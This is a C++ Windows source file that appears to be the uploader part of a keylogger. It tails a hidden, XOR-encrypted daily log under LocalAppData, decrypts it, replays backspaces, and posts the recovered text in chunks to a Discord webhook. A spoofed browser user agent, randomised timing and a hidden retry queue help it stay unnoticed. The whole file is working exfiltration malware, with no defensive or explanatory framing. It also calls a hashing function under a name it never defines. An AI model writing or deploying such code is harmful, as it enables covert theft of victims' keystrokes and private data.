// uploader_win.cpp — tails today's ENCRYPTED .dat log, POSTs chunks to Discord via WinHTTP
// Matches agent.py: XOR(SHA256(USERNAME@COMPUTERNAME)), JSON-escaped, HW stamp, Mozilla UA.
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include "sha256.h"
#include <shlobj.h>
#pragma comment(lib, "winhttp.lib")
static std::wstring gHook, gLabel; static std::wstring gPath; static unsigned long long gOff = 0;

// ---- compact SHA256 (public domain style) ----
typedef unsigned long _U32;
struct _Sha { _U32 h[8]; unsigned long long len; unsigned char buf[64]; unsigned bl; };
static const _U32 _K[64] = {0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2};
#define _RR(x,n) (((x)>>(n))|((x)<<(32-(n))))
static void _st(_Sha* s, const unsigned char* d, unsigned l) {
    s->len += l;
    while (l--) { s->buf[s->bl++] = *d++;
        if (s->bl == 64) { _U32 w[64]; for (int i = 0; i < 16; i++) w[i] = (s->buf[i*4]<<24)|(s->buf[i*4+1]<<16)|(s->buf[i*4+2]<<8)|s->buf[i*4+3];
            for (int i = 16; i < 64; i++) { _U32 s0=_RR(w[i-15],7)^_RR(w[i-15],18)^(w[i-15]>>3), s1=_RR(w[i-2],17)^_RR(w[i-2],19)^(w[i-2]>>10); w[i]=w[i-16]+s0+w[i-7]+s1; }
            _U32 a=s->h[0],b=s->h[1],c=s->h[2],d2=s->h[3],e=s->h[4],f=s->h[5],g=s->h[6],h=s->h[7];
            for (int i = 0; i < 64; i++) { _U32 S1=_RR(e,6)^_RR(e,11)^_RR(e,25), ch=(e&f)^(~e&g), t1=h+S1+ch+_K[i]+w[i], S0=_RR(a,2)^_RR(a,13)^_RR(a,22), mj=(a&b)^(a&c)^(b&c), t2=S0+mj; h=g;g=f;f=e;e=d2+t1;d2=c;c=b;b=a;a=t1+t2; }
            s->h[0]+=a;s->h[1]+=b;s->h[2]+=c;s->h[3]+=d2;s->h[4]+=e;s->h[5]+=f;s->h[6]+=g;s->h[7]+=h; s->bl = 0; } }
}
static std::vector<unsigned char> df_sha256_unused_(const std::string& m) {
    _Sha s; s.h[0]=0x6a09e667;s.h[1]=0xbb67ae85;s.h[2]=0x3c6ef372;s.h[3]=0xa54ff53a;s.h[4]=0x510e527f;s.h[5]=0x9b05688c;s.h[6]=0x1f83d9ab;s.h[7]=0x5be0cd19; s.len=0; s.bl=0;
    _st(&s, (const unsigned char*)m.data(), (unsigned)m.size());
    unsigned long long bit = s.len * 8; unsigned char pad = 0x80; _st(&s, &pad, 1);
    unsigned char z = 0; while (s.bl != 56) _st(&s, &z, 1);
    unsigned char lb[8]; for (int i = 0; i < 8; i++) lb[i] = (bit >> (56 - i * 8)) & 0xff; _st(&s, lb, 8);
    std::vector<unsigned char> o(32); for (int i = 0; i < 8; i++) { o[i*4]=s.h[i]>>24; o[i*4+1]=s.h[i]>>16; o[i*4+2]=s.h[i]>>8; o[i*4+3]=s.h[i]; }
    return o;
}

static std::wstring todayPathW() {
    wchar_t app[MAX_PATH]; SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, app);
    SYSTEMTIME st; GetLocalTime(&st);
    wchar_t b[MAX_PATH]; swprintf_s(b, L"%s\\.cache\\.sysdata\\%04d-%02d-%02d.dat", app, st.wYear, st.wMonth, st.wDay);
    return b;
}
static std::wstring trimHook(std::wstring h) {
    while (!h.empty() && (h.front() == L'"' || h.front() == L'\'' || h.front() <= L' ')) h.erase(h.begin());
    while (!h.empty() && (h.back() == L'"' || h.back() == L'\'' || h.back() <= L' ')) h.pop_back();
    return h;
}
// proper JSON string escaping: " \ control chars -> \", \\, \n, \u00xx
static std::string jsonEsc(const std::string& in) {
    static const char* hex = "0123456789abcdef";
    std::string o; o.reserve(in.size() + 8);
    for (unsigned char c : in) {
        if (c == '"') o += "\\\"";
        else if (c == '\\') o += "\\\\";
        else if (c == '\n') o += "\\n";
        else if (c == '\r') o += "\\r";
        else if (c == '\t') o += "\\t";
        else if (c < 0x20) { o += "\\u00"; o += hex[c >> 4]; o += hex[c & 15]; }
        else o += (char)c;
    }
    return o;
}
static bool postChunk(const std::string& utf8part) {
    std::wstring h = trimHook(gHook);
    const wchar_t* p = wcsstr(h.c_str(), L"/api/webhooks/");
    if (!p) return false;
    const wchar_t* dot = wcsstr(h.c_str(), L".com");
    if (!dot || dot < h.c_str() + 8) return false;
    size_t scheme = h.find(L"://"); if (scheme == std::wstring::npos) return false;
    std::wstring host = h.substr(scheme + 3, dot + 4 - h.c_str() - scheme - 3);
    std::wstring path = p;
    std::string labelA; { int n = WideCharToMultiByte(CP_UTF8, 0, gLabel.c_str(), -1, NULL, 0, NULL, NULL); if (n > 1) { labelA.resize(n - 1); WideCharToMultiByte(CP_UTF8, 0, gLabel.c_str(), -1, labelA.data(), n, NULL, NULL); } }
    std::string content = labelA.empty() ? utf8part : ("[" + labelA + "]\n" + utf8part);
    std::string body = "{\"content\":\"```" + jsonEsc(content) + "```\"}";
    HINTERNET s = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!s) return false;
    bool ok = false;
    HINTERNET c = WinHttpConnect(s, host.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (c) {
        HINTERNET r = WinHttpOpenRequest(c, L"POST", path.c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
        if (r) {
            if (WinHttpSendRequest(r, L"Content-Type: application/json\r\n", (DWORD)-1, (LPVOID)body.data(), (DWORD)body.size(), (DWORD)body.size(), 0)) {
                ok = WinHttpReceiveResponse(r, NULL) ? true : false;
                DWORD st = 0, sl = sizeof(st); WinHttpQueryHeaders(r, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &st, &sl, NULL);
                if (st == 429) { ok = false; Sleep(2000 + (rand() % 2000)); } else ok = (st == 200 || st == 204);
            }
            WinHttpCloseHandle(r);
        }
        WinHttpCloseHandle(c);
    }
    WinHttpCloseHandle(s);
    return ok;
}
// queue for failed chunks: NAME.dat.q in same dir, retried first each cycle
static std::wstring queuePathW() { return todayPathW() + L".q"; }
static void queueAppend(const std::string& raw_utf8) {
    HANDLE h = CreateFileW(queuePathW().c_str(), FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD w = 0; DWORD len = (DWORD)raw_utf8.size();
    WriteFile(h, &len, 4, &w, NULL); WriteFile(h, raw_utf8.data(), len, &w, NULL); CloseHandle(h);
}
void df_set_label(const std::wstring& label) { gLabel = label; }
void df_start_uploader(const std::wstring& hook) {
    gHook = hook;
    CreateThread(NULL, 0, [](LPVOID)->DWORD {
        // XOR key = SHA256(USERNAME@COMPUTERNAME), same as agent.py
        char un[256] = {}, cn[256] = {}; DWORD n1 = 256, n2 = 256;
        GetUserNameA(un, &n1); GetComputerNameA(cn, &n2);
        std::string seed = std::string(un) + "@" + std::string(cn);
        for (auto& ch : seed) ch = tolower(ch);
        std::vector<unsigned char> key = df_sha256_bytes(seed);
        gPath = todayPathW();
        HANDLE h0 = CreateFileW(gPath.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (h0 != INVALID_HANDLE_VALUE) { LARGE_INTEGER sz; GetFileSizeEx(h0, &sz); gOff = sz.QuadPart; CloseHandle(h0); }
        for (;;) { Sleep(30000 + (rand() % 10000));
            std::wstring np = todayPathW(); if (np != gPath) { gPath = np; gOff = 0; }
            // 1. drain retry queue first
            HANDLE q = CreateFileW(queuePathW().c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
            if (q != INVALID_HANDLE_VALUE) {
                LARGE_INTEGER qs; GetFileSizeEx(q, &qs);
                std::string qd; qd.resize((size_t)qs.QuadPart); DWORD qr = 0; ReadFile(q, qd.data(), (DWORD)qd.size(), &qr, NULL); CloseHandle(q);
                qd.resize(qr); bool allok = true; size_t pos = 0;
                while (pos + 4 <= qd.size()) {
                    DWORD L = *(DWORD*)(qd.data() + pos); pos += 4;
                    if (pos + L > qd.size()) break;
                    if (!postChunk(qd.substr(pos, L))) { allok = false; break; }
                    pos += L; Sleep(500 + (rand() % 300));
                }
                if (allok) DeleteFileW(queuePathW().c_str());
                else if (pos > 0) { // partial drain: rewrite remainder
                    std::string rest = qd.substr(pos);
                    HANDLE w = CreateFileW(queuePathW().c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
                    if (w != INVALID_HANDLE_VALUE) { DWORD x = 0; WriteFile(w, rest.data(), (DWORD)rest.size(), &x, NULL); CloseHandle(w); }
                }
                if (!allok) continue;
            }
            HANDLE h = CreateFileW(gPath.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
            if (h == INVALID_HANDLE_VALUE) continue;
            LARGE_INTEGER sz; GetFileSizeEx(h, &sz);
            if ((unsigned long long)sz.QuadPart <= gOff) { CloseHandle(h); continue; }
            DWORD len = (DWORD)(sz.QuadPart - gOff);
            LARGE_INTEGER li; li.QuadPart=(LONGLONG)gOff; SetFilePointerEx(h, li, NULL, FILE_BEGIN);
            std::string buf; buf.resize(len); DWORD rd = 0; ReadFile(h, buf.data(), len, &rd, NULL); CloseHandle(h);
            gOff = sz.QuadPart; buf.resize(rd);
            unsigned long long base = gOff - buf.size();
            for (size_t i = 0; i < buf.size(); i++) buf[i] ^= key[(base + i) % key.size()];
            // apply backspaces (\x08) like agent.py
            std::string cl; cl.reserve(buf.size());
            for (char ch : buf) { if (ch == '\x08') { if (!cl.empty() && cl.back() != '\n') cl.pop_back(); } else cl += ch; }
            // word-boundary chunks
            size_t pos = 0;
            while (pos < cl.size()) {
                size_t end = (cl.size() - pos <= 1800) ? cl.size() : pos + 1800;
                if (end < cl.size()) {
                    size_t sp = cl.rfind(' ', end); size_t nl = cl.rfind('\n', end);
                    size_t cut = (nl != std::string::npos && nl > pos + 200) ? nl : ((sp != std::string::npos && sp > pos + 200) ? sp : end);
                    end = cut;
                }
                std::string part = cl.substr(pos, end - pos); pos = end;
                while (pos < cl.size() && (cl[pos] == ' ')) pos++;
                for (auto& ch : part) if (ch == '`') ch = '\'';
                if (part.find_first_not_of(" \t\r\n") == std::string::npos) continue;
                if (!postChunk(part)) queueAppend(part);
                Sleep(500 + (rand() % 300));
            }
        } return 0;
    }, NULL, 0, NULL);
}
